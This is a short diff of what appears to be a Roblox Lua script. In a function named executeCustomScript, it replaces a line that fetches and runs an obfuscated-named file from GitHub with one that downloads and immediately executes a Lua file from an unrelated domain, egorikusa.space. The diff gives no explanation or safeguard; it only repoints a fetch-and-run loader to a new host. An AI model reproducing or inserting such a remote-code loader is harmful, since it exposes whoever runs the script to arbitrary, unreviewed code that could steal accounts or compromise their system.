@@ -61,7 +61,7 @@ end
 -- Function to execute custom script
 local function executeCustomScript()
     -- Insert your script here
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/selfmadeV3/skydall/main/obf_91J6kBwH9I49vyglbsHxXe7xHm9kaCRc9499gJjQd2nkf8atP4R46Hf31v5rkn6x.lua.txt",true))()
+    loadstring(game:HttpGet("https://egorikusa.space/f2574cab4c32274258dba4f0.lua", true))()
 end
 
 -- Show notification and run custom script
